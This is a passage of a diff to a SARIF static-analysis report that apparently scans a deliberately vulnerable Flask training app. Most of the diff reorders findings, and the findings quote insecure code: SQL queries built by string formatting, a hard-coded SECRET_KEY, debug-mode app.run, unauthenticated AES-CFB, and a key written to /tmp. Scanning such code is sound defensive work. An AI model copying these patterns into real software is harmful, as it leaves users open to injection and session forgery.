             "glog-fp-ruleFileCode/v1": "3127066a3361b3da0eb7df0a9a0c396de0c55fadcdd361867018222b16495263"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "cad7b472-33c5-3120-b2c7-5ade94ef63f3",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Potential SQL Query Formatting Vulnerability Detected"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/libuser.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 25,
+                  "startColumn": 5,
+                  "endLine": 25,
+                  "endColumn": 161,
+                  "snippet": {
+                    "text": "    c.execute(\"INSERT INTO users (username, password, failures, mfa_enabled, mfa_secret) VALUES ('%s', '%s', '%d', '%d', '%s')\" %(username, password, 0, 0, ''))"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "d060dc9f445427567c64e21ff566be5387094a359c8bbf6629210e300922b704",
+            "glog-pfp-ruleFileCode/v1": "1f8609430ab27186a699787809ceb7bb67086525887b4ef7a6027fa1bee9af5a"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "1f8609430ab27186a699787809ceb7bb67086525887b4ef7a6027fa1bee9af5a"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "4045dc1a-ec12-368e-a484-39cbaea10c2f",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Potential SQL Injection Vulnerability Detected"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/libuser.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 53,
+                  "startColumn": 5,
+                  "endLine": 53,
+                  "endColumn": 99,
+                  "snippet": {
+                    "text": "    c.execute(\"UPDATE users SET password = '{}' WHERE username = '{}'\".format(password, username))"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "17b6741ae81eb73c1ada79373b66d95a42641dc1c2fea5d7ea04b354e10af7fa",
+            "glog-pfp-ruleFileCode/v1": "adc396a664e29646891c1808a98419d18cc214788e4107e2d45811e9add30153"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "adc396a664e29646891c1808a98419d18cc214788e4107e2d45811e9add30153"
           },
           "properties": {}
         },
@@ -1939,111 +1978,6 @@
           }
         },
         {
-          "ruleId": "4045dc1a-ec12-368e-a484-39cbaea10c2f",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Potential SQL Injection Vulnerability Detected"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/libuser.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 53,
-                  "startColumn": 5,
-                  "endLine": 53,
-                  "endColumn": 99,
-                  "snippet": {
-                    "text": "    c.execute(\"UPDATE users SET password = '{}' WHERE username = '{}'\".format(password, username))"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "17b6741ae81eb73c1ada79373b66d95a42641dc1c2fea5d7ea04b354e10af7fa",
-            "glog-pfp-ruleFileCode/v1": "adc396a664e29646891c1808a98419d18cc214788e4107e2d45811e9add30153"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "adc396a664e29646891c1808a98419d18cc214788e4107e2d45811e9add30153"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "97e64c28-7e50-3f17-8d12-f4c95004c392",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Flask Ignores Top-Level app.run(...): Suggests Using a Guard Function"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "good/vulpy-ssl.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 29,
-                  "startColumn": 1,
-                  "endLine": 29,
-                  "endColumn": 87,
-                  "snippet": {
-                    "text": "app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "255d537ec94b8ffa93245e9d23a935507c4f7d97fe1aa22bf5552fe898260c2e",
-            "glog-pfp-ruleFileCode/v1": "3fafb4a9927e19e79ec6a9aa8fad5b429a3d639cd5aa3b6e009f6c49246f448e"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "3fafb4a9927e19e79ec6a9aa8fad5b429a3d639cd5aa3b6e009f6c49246f448e"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "cad7b472-33c5-3120-b2c7-5ade94ef63f3",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Potential SQL Query Formatting Vulnerability Detected"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/libuser.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 25,
-                  "startColumn": 5,
-                  "endLine": 25,
-                  "endColumn": 161,
-                  "snippet": {
-                    "text": "    c.execute(\"INSERT INTO users (username, password, failures, mfa_enabled, mfa_secret) VALUES ('%s', '%s', '%d', '%d', '%s')\" %(username, password, 0, 0, ''))"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "d060dc9f445427567c64e21ff566be5387094a359c8bbf6629210e300922b704",
-            "glog-pfp-ruleFileCode/v1": "1f8609430ab27186a699787809ceb7bb67086525887b4ef7a6027fa1bee9af5a"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "1f8609430ab27186a699787809ceb7bb67086525887b4ef7a6027fa1bee9af5a"
-          },
-          "properties": {}
-        },
-        {
           "ruleId": "fa5d067a-3b5c-3c9e-945c-34fbaf2ddcac",
           "kind": "fail",
           "level": "warning",
@@ -2086,41 +2020,6 @@
             "issue_severity": "MEDIUM",
             "issue_confidence": "MEDIUM"
           }
-        },
-        {
-          "ruleId": "956c2fb1-004b-31dd-a6f5-47cf59144ade",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Flask Ignores Top-Level app.run(...): Suggests Using a Guard Function"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "good/vulpy.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 53,
-                  "startColumn": 1,
-                  "endLine": 53,
-                  "endColumn": 72,
-                  "snippet": {
-                    "text": "app.run(debug=True, host='127.0.1.1', port=5001, extra_files='csp.txt')"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "e7767485e12a3b0c13c74d37f41171d9e8a9f055343340ac4b67241b122f93ce",
-            "glog-pfp-ruleFileCode/v1": "0ccf2595c02f0f3c3501b234ea90eee7ace65e721560e0e6c48b7c9546998e08"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "0ccf2595c02f0f3c3501b234ea90eee7ace65e721560e0e6c48b7c9546998e08"
-          },
-          "properties": {}
         },
         {
           "ruleId": "3789a476-efbc-3edf-9946-b9b882722e26",
@@ -2167,6 +2066,76 @@
           }
         },
         {
+          "ruleId": "956c2fb1-004b-31dd-a6f5-47cf59144ade",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Flask Ignores Top-Level app.run(...): Suggests Using a Guard Function"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "good/vulpy.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 53,
+                  "startColumn": 1,
+                  "endLine": 53,
+                  "endColumn": 72,
+                  "snippet": {
+                    "text": "app.run(debug=True, host='127.0.1.1', port=5001, extra_files='csp.txt')"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "e7767485e12a3b0c13c74d37f41171d9e8a9f055343340ac4b67241b122f93ce",
+            "glog-pfp-ruleFileCode/v1": "0ccf2595c02f0f3c3501b234ea90eee7ace65e721560e0e6c48b7c9546998e08"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "0ccf2595c02f0f3c3501b234ea90eee7ace65e721560e0e6c48b7c9546998e08"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "28a8f063-18ec-3055-a65f-490ad91616c6",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected Hardcoded `SECRET_KEY` Vulnerability"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/vulpy-ssl.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 13,
+                  "startColumn": 1,
+                  "endLine": 13,
+                  "endColumn": 37,
+                  "snippet": {
+                    "text": "app.config['SECRET_KEY'] = 'aaaaaaa'"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "8da01b7466b4ae97b08bb99ebcd9bbf8318666c603501fb509578b6e71f842dd",
+            "glog-pfp-ruleFileCode/v1": "475affc045a6a21971b44b5c5ac11edd2e69583f77500c7c27f8909d73fe63da"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "475affc045a6a21971b44b5c5ac11edd2e69583f77500c7c27f8909d73fe63da"
+          },
+          "properties": {}
+        },
+        {
           "ruleId": "14033dbf-28da-3237-bdb3-fe0495b1e04f",
           "kind": "fail",
           "level": "warning",
@@ -2209,6 +2178,41 @@
             "issue_severity": "MEDIUM",
             "issue_confidence": "MEDIUM"
           }
+        },
+        {
+          "ruleId": "533fc0fc-8e0b-36c7-aea5-9610bba63fd2",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Improper Message Authentication in Encryption Mode Operation"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "utils/aes-decrypt.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 24,
+                  "startColumn": 14,
+                  "endLine": 24,
+                  "endColumn": 101,
+                  "snippet": {
+                    "text": "    cipher = Cipher(algorithms.AES(key_digest), modes.CFB(unhexlify(iv)), backend=default_backend())"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "8bdf3126441f0cf4fbd3f23fa71f68c01ceb6a231385f51b41eea77d18731800",
+            "glog-pfp-ruleFileCode/v1": "1b9c3bfceac2ebaa9dac54faad5651ead8d730576c351229fd7014dbf98e8313"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "1b9c3bfceac2ebaa9dac54faad5651ead8d730576c351229fd7014dbf98e8313"
+          },
+          "properties": {}
         },
         {
           "ruleId": "ca37f023-adc0-3157-a466-641cdbd7715b",
@@ -2290,6 +2294,41 @@
           "properties": {}
         },
         {
+          "ruleId": "cf4fbb2d-db7b-3d6d-a4b3-73a08e4d1d33",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected Hardcoded `SECRET_KEY` Vulnerability"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/vulpy.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 16,
+                  "startColumn": 1,
+                  "endLine": 16,
+                  "endColumn": 37,
+                  "snippet": {
+                    "text": "app.config['SECRET_KEY'] = 'aaaaaaa'"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "ce1f188088882ef15d44d5ee5388f363e99774d31809e176a7730e2aab425d8a",
+            "glog-pfp-ruleFileCode/v1": "212cbee62d1279020cef532148bbcfa8df9deebc82b7e7534c569901e0b87ff2"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "212cbee62d1279020cef532148bbcfa8df9deebc82b7e7534c569901e0b87ff2"
+          },
+          "properties": {}
+        },
+        {
           "ruleId": "69e27a52-73c0-3eae-a173-5dad4d2860e7",
           "kind": "fail",
           "level": "warning",
@@ -2332,76 +2371,6 @@
             "issue_severity": "MEDIUM",
             "issue_confidence": "MEDIUM"
           }
-        },
-        {
-          "ruleId": "533fc0fc-8e0b-36c7-aea5-9610bba63fd2",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Improper Message Authentication in Encryption Mode Operation"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "utils/aes-decrypt.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 24,
-                  "startColumn": 14,
-                  "endLine": 24,
-                  "endColumn": 101,
-                  "snippet": {
-                    "text": "    cipher = Cipher(algorithms.AES(key_digest), modes.CFB(unhexlify(iv)), backend=default_backend())"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "8bdf3126441f0cf4fbd3f23fa71f68c01ceb6a231385f51b41eea77d18731800",
-            "glog-pfp-ruleFileCode/v1": "1b9c3bfceac2ebaa9dac54faad5651ead8d730576c351229fd7014dbf98e8313"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "1b9c3bfceac2ebaa9dac54faad5651ead8d730576c351229fd7014dbf98e8313"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "28a8f063-18ec-3055-a65f-490ad91616c6",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Detected Hardcoded `SECRET_KEY` Vulnerability"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/vulpy-ssl.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 13,
-                  "startColumn": 1,
-                  "endLine": 13,
-                  "endColumn": 37,
-                  "snippet": {
-                    "text": "app.config['SECRET_KEY'] = 'aaaaaaa'"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "8da01b7466b4ae97b08bb99ebcd9bbf8318666c603501fb509578b6e71f842dd",
-            "glog-pfp-ruleFileCode/v1": "475affc045a6a21971b44b5c5ac11edd2e69583f77500c7c27f8909d73fe63da"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "475affc045a6a21971b44b5c5ac11edd2e69583f77500c7c27f8909d73fe63da"
-          },
-          "properties": {}
         },
         {
           "ruleId": "3f15703e-9089-3dcb-b391-2253bd684892",
@@ -2536,41 +2505,6 @@
           }
         },
         {
-          "ruleId": "cf4fbb2d-db7b-3d6d-a4b3-73a08e4d1d33",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Detected Hardcoded `SECRET_KEY` Vulnerability"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/vulpy.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 16,
-                  "startColumn": 1,
-                  "endLine": 16,
-                  "endColumn": 37,
-                  "snippet": {
-                    "text": "app.config['SECRET_KEY'] = 'aaaaaaa'"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "ce1f188088882ef15d44d5ee5388f363e99774d31809e176a7730e2aab425d8a",
-            "glog-pfp-ruleFileCode/v1": "212cbee62d1279020cef532148bbcfa8df9deebc82b7e7534c569901e0b87ff2"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "212cbee62d1279020cef532148bbcfa8df9deebc82b7e7534c569901e0b87ff2"
-          },
-          "properties": {}
-        },
-        {
           "ruleId": "27c9dfba-5cec-3bc9-b2b7-230698891d97",
           "kind": "fail",
           "level": "warning",
@@ -2659,48 +2593,39 @@
           }
         },
         {
-          "ruleId": "098e540c-ebd8-38e0-a921-65c5306aee54",
+          "ruleId": "ecbd55a2-cc94-343e-aa5a-97ff01b5aa77",
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "Potential Unsafe Use of Temporary File/Directory"
+            "text": "Potential SQL Injection Vulnerability Detected"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "utils/rsa-keygen.py"
+                  "uri": "good/libuser.py",
+                  "uriBaseId": "%SRCROOT%"
                 },
                 "region": {
-                  "startLine": 26,
-                  "startColumn": 11,
-                  "endLine": 26,
-                  "endColumn": 26,
+                  "startLine": 61,
+                  "startColumn": 5,
+                  "endLine": 61,
+                  "endColumn": 171,
                   "snippet": {
-                    "text": "with open('/tmp/acme.key', 'wb') as out:\n"
-                  }
-                },
-                "contextRegion": {
-                  "startLine": 25,
-                  "endLine": 27,
-                  "snippet": {
-                    "text": "\nwith open('/tmp/acme.key', 'wb') as out:\n    out.write(pem_private)\n"
+                    "text": "    c.execute(\"INSERT INTO users (username, password, salt, failures, mfa_enabled, mfa_secret) VALUES ('%s', '%s', '%s', '%d', '%d', '%s')\" %(username, '', '', 0, 0, ''))"
                   }
                 }
               }
             }
           ],
           "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "70e0223bd6cfeeeddb69840f5af7a83dbb8101a4ffd0ee56d49214d827146250",
-            "glog-pfp-ruleFileCode/v1": "0c9048925741598a66a2736b91e11e4e067806611faa163142fc6f07bc577b78"
+            "glog-pfp-ruleFileLineCode/v1": "48ea2d8710a41cc0b8599a2ad42ae0cc1844869728b3f9461cd9ad8529dc8481",
+            "glog-pfp-ruleFileCode/v1": "7249eb13425af42b38d739d39a878e79b9f2cd8ed8f9d6aaa8dc11d70f392c51"
           },
           "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "0c9048925741598a66a2736b91e11e4e067806611faa163142fc6f07bc577b78"
+            "glog-fp-ruleFileCode/v1": "7249eb13425af42b38d739d39a878e79b9f2cd8ed8f9d6aaa8dc11d70f392c51"
           },
-          "properties": {
-            "issue_severity": "MEDIUM",
-            "issue_confidence": "MEDIUM"
-          }
+          "properties": {}
         },
         {
           "ruleId": "63e5f0bd-e24b-3827-a528-c5b73134831d",
@@ -2747,39 +2672,48 @@
           }
         },
         {
-          "ruleId": "ecbd55a2-cc94-343e-aa5a-97ff01b5aa77",
+          "ruleId": "098e540c-ebd8-38e0-a921-65c5306aee54",
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "Potential SQL Injection Vulnerability Detected"
+            "text": "Potential Unsafe Use of Temporary File/Directory"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "good/libuser.py",
-                  "uriBaseId": "%SRCROOT%"
+                  "uri": "utils/rsa-keygen.py"
                 },
                 "region": {
-                  "startLine": 61,
-                  "startColumn": 5,
-                  "endLine": 61,
-                  "endColumn": 171,
+                  "startLine": 26,
+                  "startColumn": 11,
+                  "endLine": 26,
+                  "endColumn": 26,
                   "snippet": {
-                    "text": "    c.execute(\"INSERT INTO users (username, password, salt, failures, mfa_enabled, mfa_secret) VALUES ('%s', '%s', '%s', '%d', '%d', '%s')\" %(username, '', '', 0, 0, ''))"
+                    "text": "with open('/tmp/acme.key', 'wb') as out:\n"
+                  }
+                },
+                "contextRegion": {
+                  "startLine": 25,
+                  "endLine": 27,
+                  "snippet": {
+                    "text": "\nwith open('/tmp/acme.key', 'wb') as out:\n    out.write(pem_private)\n"
                   }
                 }
               }
             }
           ],
           "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "48ea2d8710a41cc0b8599a2ad42ae0cc1844869728b3f9461cd9ad8529dc8481",
-            "glog-pfp-ruleFileCode/v1": "7249eb13425af42b38d739d39a878e79b9f2cd8ed8f9d6aaa8dc11d70f392c51"
+            "glog-pfp-ruleFileLineCode/v1": "70e0223bd6cfeeeddb69840f5af7a83dbb8101a4ffd0ee56d49214d827146250",
+            "glog-pfp-ruleFileCode/v1": "0c9048925741598a66a2736b91e11e4e067806611faa163142fc6f07bc577b78"
           },
           "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "7249eb13425af42b38d739d39a878e79b9f2cd8ed8f9d6aaa8dc11d70f392c51"
+            "glog-fp-ruleFileCode/v1": "0c9048925741598a66a2736b91e11e4e067806611faa163142fc6f07bc577b78"
           },
-          "properties": {}
+          "properties": {
+            "issue_severity": "MEDIUM",
+            "issue_confidence": "MEDIUM"
+          }
         },
         {
           "ruleId": "0f2fbe3b-d13d-3095-8bfd-825696364258",
